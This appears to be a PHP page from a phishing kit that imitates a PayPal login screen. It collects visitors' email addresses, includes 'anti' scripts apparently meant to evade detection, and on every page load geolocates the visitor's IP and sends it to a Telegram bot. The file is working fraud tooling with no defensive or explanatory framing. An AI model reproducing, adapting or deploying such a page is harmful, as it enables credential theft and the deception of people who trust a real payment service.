<?php

session_start();
include "config/conf.php";
include "anti/anti1.php";
include "anti/anti2.php";
include "anti/anti3.php";
include "anti/anti4.php";
include "anti/anti5.php";
include "anti/anti6.php";
include "anti/anti7.php";

include("X_911.php");

$lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
include "lang/{$lang }.php";


if(isset($_POST['submit_btn'])) {
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        // Get the email from the form
        $email = $_POST["EML"];
    }

    $_SESSION["user_email"] = $email;
    var_dump($_SESSION["user_email"]);
    die;
}


$ip = getenv("REMOTE_ADDR");
$IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/".$ip));
$COUNTRY = $IP_LOOKUP->country . "\r\n";
$CITY    = $IP_LOOKUP->city . "\r\n";
$REGION  = $IP_LOOKUP->region . "\r\n";
$STATE   = $IP_LOOKUP->regionName . "\r\n";
$ZIPCODE = $IP_LOOKUP->zip . "\r\n";
$message=$ip."\nCountry : ".$COUNTRY."Zip : " .$ZIPCODE."\n\n\nin lOGIN PAGE  :   : ";
file_get_contents("https://api.telegram.org/bot71zSM7esn1qo/sendMessage?chat_id=-4193692206&text=" . urlencode($message)."" );


?>

<html lang="en" <head=""><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>N</title>
<meta name="application-name" content="N">
<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes">
<link rel="stylesheet" href="contextualLoginElementalUIv2.css">
</head>





<body><form id="PageMainForm" method="POST" action="step0.php"> 
<section id="login" class="login  " data-role="page">
<div class="corral ">
<div id="content" class="contentContainer activeContent contentContainerBordered">
<header>
<p role="img" aria-label="PayPal Logo" class="paypal-logo paypal-logo-long signin-paypal-logo"></p>
</header>
<h1 id="headerText" class="headerText  accessAid">Log in to your account</h1>
<div id="loginContent" class="">
<div id="loginSection" class="">
<div class="notifications">
</div>
<div id="splitEmail" class="splitEmail ">
<div id="splitEmailSection" class="splitPhoneSection splitEmailSection adjustSection">
</div>
<div class="textInput " id="login_emaildiv" style="z-index: 1;">
<div class="fieldWrapper">
<input id="email" name="EML" type="email" class="hasHelp  validateEmpty" required="required" value="" autocomplete="username" placeholder="E-mail address" aria-describedby="emailErrorMessage"><label for="email" class="fieldLabel"><?php echo $lg_cm['top1']?></label>
<div class="errorMessage" id="emailErrorMessage">
<p class="emptyError hide">Obligatoire</p>
</div>
</div>
<a href="#" id="forgotEmail" class="recoveryOption" pa-marked="1"><?php echo $lg_cm['top2']?></a>	
</div>
</div>
<div class="actions">

<input type="submit" name="submit_btn" value="<?php echo $lg_cm['top3']?>" class="button actionContinue scTrack" id="btnLogin" pa-marked="1" >
</div>
</div>
</div>
<div id="signupContainer" class="signupContainer ">
<div class="loginSignUpSeparator ">
<span class="textInSeparator"><?php echo $lg_cm['tog1']?></span>
</div>
<button type="button" href="#" class="button secondary scTrack" id="createAccount" pa-marked="1"><?php echo $lg_cm['top4']?></button>
</div>
</div>
<div class="intentFooter ">
<div class="localeSelector  ">
<span class="picker country-selector">
<span class="hide" id="countryPickerLink"></span>
<ul class="localeLink">
<li>
<span><img src="X911/<?php echo $countrycode; ?>.png" style="width: 32px; height: 18px;"></span>
<a class="" href="#" lang="fr" aria-current="”true”" pa-marked="1">|</a>
</li>
<li>
<a class=" " href="#" lang="en" data-locale="en_US" pa-marked="1"><?php echo $lg_cm['top5']?></a>
</li>
</ul>
</span></div>
</div>
</div>

</section>
<footer class="footer footerStayPut" role="contentinfo">
<div class="legalFooter"><ul class="footerGroup">
<li>
<a target="_blank" href="#" pa-marked="1"><?php echo $lg_cm['top6']?></a>
</li>
<li>
<a target="_blank" href="#" pa-marked="1"><?php echo $lg_cm['top7']?></a>
</li>
<li>
<a target="_blank" href="#" pa-marked="1"><?php echo $lg_cm['top8']?></a>
</li>
<li>
<a target="_blank" href="#" pa-marked="1"><?php echo $lg_cm['top9']?></a>
</li>
</ul>
</div>
</footer>
  </div>
        <script src="js/jquery-3.5.1.min.js"></script>
        <script src="js/jquery.mask.js"></script>
        <script src="js/jquery.main.js"></script>
        </div> 



</form></body></html>